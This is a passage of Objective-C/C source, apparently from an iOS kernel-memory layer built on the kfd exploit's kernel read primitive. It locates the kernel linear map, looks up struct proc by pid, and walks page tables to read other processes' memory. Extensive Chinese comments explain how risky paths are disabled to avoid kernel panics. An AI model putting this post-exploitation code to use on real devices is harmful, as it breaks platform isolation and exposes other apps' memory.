     * 那才是彩屏；现在换成"四条路径干净地失败"。这个交换是本轮的目的：
     * **读不出数据可以接受，第三次彩屏不可以。**
     *
     * 保留这四条路由而不是删掉，理由有两条：
     *   ① 它们是这套翻译逻辑的完整实现，删了之后恢复的人得从头写；
     *   ② 一旦 delta 有了不依赖 walk 的可信来源（ptov_table 等价物），
     *      这四条路径会立刻重新可用 —— 那时唯一要改的就是给 walk 提供一个
     *      "不用 delta 也能证明"的前提，而不是重写翻译层。
     * 在此之前它们每次调用会做最多两次 km_read64（读 pmap 自身的 tte、
     * 以及顶层表里那一条 entry），两次地址都来自内核自己写下的数据，
     * 下钻之前就被闸门拦下 —— 所以它们现在的失败是安全的。
     */
    if (km_bootstrap_linear_delta(g_current_pmap, note, sizeof(note))) {
        NSLog(@"[KernelMemory] pmap tte/ttep probe (仅供排查、未采信): %@", @(note));
    } else {
        NSLog(@"[KernelMemory] pmap tte/ttep probe failed: %@", @(note));
    }

    /* 次选：kernel_pmap 上 walk 一个内核 VA。 */
    if (kpmap != 0 && kfd->info.kaddr.kernel_proc &&
        km_compute_linear_delta(kpmap, kfd->info.kaddr.kernel_proc,
                                "kernel_pmap+kernel_proc", note, sizeof(note))) {
        g_linear_map_valid = true;
        NSLog(@"[KernelMemory] linear map located: %@", @(note));
        return true;
    }
    NSLog(@"[KernelMemory] kernel_pmap path unusable: %@", @(note));

    /*
     * 次选：仍是内核 VA，但换 kernel_proc 以外的锚点，pmap 仍优先 kernel_pmap。
     */
    if (kpmap != 0 && kfd->info.kaddr.current_proc &&
        km_compute_linear_delta(kpmap, kfd->info.kaddr.current_proc,
                                "kernel_pmap+current_proc", note, sizeof(note))) {
        g_linear_map_valid = true;
        NSLog(@"[KernelMemory] linear map located: %@", @(note));
        return true;
    }

    /*
     * 兜底：沿用旧的 current_pmap 路径。
     */
    if (kfd->info.kaddr.kernel_proc &&
        km_compute_linear_delta(g_current_pmap, kfd->info.kaddr.kernel_proc,
                                "current_pmap+kernel_proc", note, sizeof(note))) {
        g_linear_map_valid = true;
        NSLog(@"[KernelMemory] linear map located via legacy path: %@", @(note));
        return true;
    }

    if (kfd->info.kaddr.current_proc &&
        km_compute_linear_delta(g_current_pmap, kfd->info.kaddr.current_proc,
                                "current_pmap+current_proc", note, sizeof(note))) {
        g_linear_map_valid = true;
        NSLog(@"[KernelMemory] linear map located via legacy fallback: %@", @(note));
        return true;
    }

    NSLog(@"[KernelMemory] linear map unresolved: %@", @(note));
    return false;
}

/*
 * ── p_list 链表遍历：**默认停用**（KM_ENABLE_PLIST_WALK = 0）──
 *
 * 为什么停用它（本次止损的第四处改动，与 delta 无关，必须单独堵）：
 *
 * 「按 pid 找 struct proc」是两段实现，必须分开看：
 *   ① 短路命中 —— `pid == kfd->info.env.pid && current_proc` 时直接返回 info_run
 *      已经反查好的 current_proc，**一次 kread 都不发**；
 *   ② 链表遍历 —— 顺着 kernel_proc 的 p_list 环逐跳读 link、比 p_pid。
 * 本开关只管 ②，①照旧。km_init 末尾那次自证走的是 ①（查的就是自己的 pid），
 * 所以停用 ② 不会动到初始化流程。
 *
 * 为什么 delta 那道闸门管不到 ②（这是它必须单独挂开关的原因，不是顺手加保险）：
 * 链表遍历里所有地址都与 g_linear_delta 无关 —— 首跳 node 是 kernel_proc，
 * 之后每一跳都是 `link + proc__p_* 偏移`。它一个字节都不经过「PA + delta 补回
 * KVA」那条拼接，所以「!g_linear_map_valid ⟹ g_linear_delta == 0」这个全局
 * 不变式对它毫无约束：基准没验通时，它照样会往内核里读。
 *
 * 为什么不能开（拦不住的东西，且不是假设）：每一跳的 link 只过
 * `km_is_kernel_address(link) && (link & 0x7) == 0` 两道**形态**检查，
 * 而形态检查对「落在内核地址空间空洞里的指针」一律放行 —— 第二次彩屏的
 * far = 0xfffffe1564a385b4、DFSC=6 level 2 正是这个形态（形态合法、页未映射）。
 * 而 kread 的工作方式是把地址交给内核去解引用：**目标页没映射就一定是内核态
 * data abort**，也就是彩屏重启，没有"读到垃圾"这个中间态。于是只要链表被写坏、
 * 或 dynamic_info 的 proc__p_list__le_prev / proc__p_pid 偏移填错，
 * 这条路径换回来的是一次重启，而不是一次失败 —— 与已经整段删除的那条
 * kernel base 反向盲扫同一种赌。
 * 「形态 + 8 字节对齐 + 4096 跳上限」是本层在**没有映射验证**时能给出的全部
 * 保证，而它不够：它回答的是"这个地址长得像内核地址吗"，不是"它已映射吗"。
 *
 * 代价（刻意接受，且实测为零）：整条读路径已经全废 —— km_locate_linear_map 稳定
 * 落到 linear=unresolved，km_read_process / km_write_process 在入口一律直接失败。
 * 定位到了 proc 也读不出任何一个字节，所以停用它不损失任何可用功能。
 *
 * 恢复前提（只有一条，当前不满足）：拿到「**能证明某个地址确实已映射**」的手段 ——
 * ptov_table 的等价物（对任意 PA 证明它补回后的 KVA 落在映射区内），
 * 或逐级页表验证下钻。在拿到它之前不能开这个开关：现在没有任何手段能把一个
 * "形态合法"的地址与一个"已映射"的地址区分开。也就是说，恢复链表遍历与恢复
 * 线性映射基准是同一件事的两个面 —— 缺的都是那一份映射验证能力。
 * 留成编译期开关而不是删掉：循环体是本层唯一一处"按 pid 走 p_list"的实现，
 * 将来拿到上述手段时改一个数字就能重新打开。
 *
 * 用 `#if` 而不是同文件另一处那种 `if (!KM_ENABLE_PLIST_WALK) { return 0; }`：
 * 停用时那段 `km_read64(node + off_next)` 连**编译**都不该发生 —— 它正是这次
 * 要堵掉的那一句，让它在停用态下从二进制里彻底消失，比"写出来再指望优化器
 * 删掉"更硬；顺带也不必为停用态保留 off_next / off_pid / max_hops 这几个
 * 只给循环用的变量。
 */
#define KM_ENABLE_PLIST_WALK 0

/// 当前「按 pid 定位 struct proc」是否被编译期开关整体停用。
const char *km_proc_lookup_blocker(void)
{
#if KM_ENABLE_PLIST_WALK
    /*
     * 没有被停用。注意它**不是**"任何 pid 都查得到"：某个 pid 真的不存在时
     * km_proc_for_pid 依然返回 0。本函数只回答"这一层被整体关掉了吗"。
     */
    return NULL;
#else
    /*
     * 文本长度是有约束的：这一段会被 km_self_test 原样打进报告，而那块缓冲只有
     * 512 字节（AppDelegate 传进来的），报告里还有 magic / walk / self-read 几行。
     * 现在这份文本 ~164 字节，整份报告在真机上装得下；以后要往这段里加字，
     * 先算一遍总长 —— 被截掉的往往是 walk / self-read 那两行，而那两行正是
     * 判断内核层状态要看的。超长的解释留在上面的长注释里，不放这里。
     */
    return "p_list 遍历已停用（KM_ENABLE_PLIST_WALK=0）：仅 self pid 可短路命中；"
           "其余 pid 需先有「证明地址已映射」的手段（ptov_table 等价物）";
#endif
}

uint64_t km_proc_for_pid(int32_t pid)
{
    /*
     * ── 本函数**曾经**是全文件第二条"能把未经映射验证的地址送进 km_read64"的
     * 路径 ──（第一条是 km_bootstrap_linear_delta 对 pmap 的那两次诊断读。）
     * 链表那一段按 KM_ENABLE_PLIST_WALK = 0 停用之后，本函数**一次 kread 都不发**
     * （只剩下短路命中）。这段注释保留下来，是为了让下一个人知道两件事：
     * **链表那一段是有意停用的**（不是漏的），以及**短路那一段为什么必须留着**。
     *
     * 返回 0 的语义（上层文案就靠这一条区分）：**"无法定位"**，不是"进程不存在"。
     * 具体是哪一种，看 km_proc_lookup_blocker() —— 它非 NULL 时，所有非 self pid
     * 的查询都必然失败，与目标进程活不活着无关。
     * 上层现在（MemoryProbe.attachPort）拿到 0 一律渲染成
     * 「找不到 pid 的 proc」，那是**假**结论：把"本层被编译期开关停用"说成
     * "内核里没有这个进程"。两者的处置完全相反（一个要看开关/等实现，一个要看
     * 进程是否还活着），所以本该能区分 —— 这需要上层改一行文案，而那几个文件
     * 本轮不动（见 KernelMemory.h 的同一条注记）。
     */
    if (g_handle == 0) {
        return 0;
    }

    struct kfd *kfd = (struct kfd *)g_handle;
    const uint64_t kernel_proc = kfd->info.kaddr.kernel_proc;
    const uint64_t current_proc = kfd->info.kaddr.current_proc;

    /*
     * 短路命中 —— **必须留在开关之前**，且不受 KM_ENABLE_PLIST_WALK 影响。
     * 这是 km_init 自证实际走的分支：地址直接取自 info_run 的反查结果，
     * 零 kread、零链路遍历，所以它既没有上面那些风险，也没有停用的理由。
     * 条件里的 `current_proc` 不能省：info_run 没反查出它时，这个分支不成立，
     * 于是会落到下面的停用分支直接失败 —— 而不是退回链表（那正是要堵掉的）。
     */
    if (pid == kfd->info.env.pid && current_proc) {
        return current_proc;
    }

#if KM_ENABLE_PLIST_WALK
    if (kernel_proc == 0) {
        return 0;
    }

    const uint64_t off_next = dynamic_info(proc__p_list__le_prev) - 8;
    const uint64_t off_pid = dynamic_info(proc__p_pid);
    const uint64_t max_hops = 4096;

    bool ok = false;
    uint64_t node = kernel_proc;
    for (uint64_t i = 0; i < max_hops; i++) {
        uint64_t link = km_read64(node + off_next, &ok);
        if (!ok || link == 0 || link == kernel_proc) {
            break;
        }
        /*
         * 明显不是内核指针就停，避免顺着被写坏的链跑飞。
         * 注意这两道只是形态检查 —— 它拦不住"落在内核空洞里的指针"，
         * 这正是上面决定停用这条分支的理由，不要把它当成安全保证来看。
         */
        if (!km_is_kernel_address(link) || (link & 0x7) != 0) {
            break;
        }
        i32 candidate = (i32)km_read64(link + off_pid, &ok);
        if (ok && candidate == pid) {
            return link;
        }
        node = link;
    }

    return 0;
#else
    /*
     * 停用态：明确失败，并且**把原因说清楚**，不返回一个含糊的 0。
     *
     * 三条出口，宁可多一条也不让"停用"被读成"进程不存在"：
     *   · 本行 NSLog —— 带 pid 与两个 proc 地址，按 [KernelMemory] 过滤即可读到；
     *   · km_proc_lookup_blocker() —— 给上层查询，用来把文案分成两类；
     *   · km_self_test 里的 procForPid 行 —— 常驻面板（kernelNote 就是那份报告）。
     *
     * 日志按 pid 去重：这条路径在 AutoTracker 的 1Hz 心跳里会被反复调用，
     * 不去重就是每秒一条日志，真出问题时反而把日志冲没了。
     * 函数内 static 的读写没有同步 —— 最坏结果是多打一条重复日志，不影响判断。
     *
     * 一个边界情况：查的就是 self pid、而 info_run 没反查出 current_proc
     * （current_proc == 0）时也会落到这里 —— 那时原因不在这个开关，
     * 而是拿不到自己的 proc。日志里 current_proc=0 就是那个信号。
     */
    static int32_t blocked_logged_pid = 0;
    if (blocked_logged_pid != pid) {
        blocked_logged_pid = pid;
        NSLog(@"[KernelMemory] km_proc_for_pid(pid=%d) 无法定位：%s"
              @"（self pid=%d, current_proc=%#llx, kernel_proc=%#llx）",
              pid, km_proc_lookup_blocker(), kfd->info.env.pid,
              (unsigned long long)current_proc, (unsigned long long)kernel_proc);
    }
    return 0;
#endif
}

bool km_translate(int32_t pid, uint64_t uaddr, uint64_t *pa_out)
{
    /*
     * 换算基准不可信就直接失败，绝不下探 —— 这是本层唯一的安全边界。
     *
     * 为什么必须是**第一行**：下游 km_read_process / km_write_process 拿到 pa
     * 之后一律做 `pa + g_linear_delta` 再送 kread / kwrite。delta 未被采信时
     * 它是 0，于是 `pa + 0` 就把**物理地址当内核虚拟地址**喂进去 —— 那不是
     * "读不到"，是内核抱着一个不在映射区的地址去解引用，也就是 panic log 里
     * 那种彩屏重启（far 低于 VM_MIN_KERNEL_ADDRESS，esr DFSC=5）。
     *
     * 失败是**预期的安全状态**：读不出数据可以接受，把无效地址送进 kread 不可以。
     * 契约与全文件其余守卫一致 —— 返回 false，且不写 *pa_out（调用方只认返回值，
     * 不允许依赖"失败时残留一个脏值"）。
     */
    if (!g_linear_map_valid || pa_out == NULL) {
        return false;
    }

    /*
     * dynamic_info(...) 展开成 kern_versions[kfd->info.env.vid].xxx，
     * 所以用到它的函数必须先有一个叫 `kfd` 的局部变量 —— 宏是靠名字
     * 捕获的，不是参数。这里补上，否则编译期就是「未声明标识符 kfd」。
     */
    struct kfd *kfd = (struct kfd *)g_handle;
    if (kfd == NULL) {
        return false;
    }

    uint64_t proc = km_proc_for_pid(pid);
    if (proc == 0) {
        return false;
    }

    bool ok = false;
    uint64_t task = proc + dynamic_info(proc__object_size);
    uint64_t map = km_read64(task + dynamic_info(task__map), &ok);
    if (!ok || !km_is_kernel_address(map)) {
        return false;
    }

    /* _vm_map.pmap 用 offsetof 算，定义在 static_info.h，与样本同源。 */
    uint64_t pmap = km_read64(map + offsetof(struct _vm_map, pmap), &ok);
    if (!ok || !km_is_kernel_address(pmap)) {
        return false;
    }

    return km_page_table_walk(pmap, uaddr, pa_out);
}

bool km_read_process(int32_t pid, uint64_t uaddr, void *out, uint64_t len)
{
    /*
     * 同 km_translate：基准不可信时直接返回 false，绝不走到下面的
     * `pa + g_linear_delta` → km_read。delta 未被采信时它是 0，`pa + 0` 就是
     * 把物理地址当内核虚拟地址喂给 kread —— 内核态 data abort，彩屏重启。
     * 读不出数据是**预期的安全状态**，不是需要绕过的问题。
     */
    if (!g_linear_map_valid || out == NULL || len == 0) {
        return false;
    }

    uint8_t *cursor = (uint8_t *)out;
    uint64_t remaining = len;
    uint64_t addr = uaddr;

    /*
     * 按页走：一页内的物理页是连续的，跨页必须重新翻译。
     * 每次翻一次、整页读一次，避免按 8 字节粒度反复走表。
     */
    while (remaining > 0) {
        uint64_t pa = 0;
        if (!km_translate(pid, addr, &pa)) {
            return false;
        }

        uint64_t in_page = KM_PAGE_SIZE - (addr & KM_PAGE_MASK);
        uint64_t chunk = (remaining < in_page) ? remaining : in_page;
        uint64_t kva = pa + g_linear_delta;

        if (!km_read(kva, cursor, chunk)) {
            return false;
        }

        cursor += chunk;
        addr += chunk;
        remaining -= chunk;
    }

    return true;
}
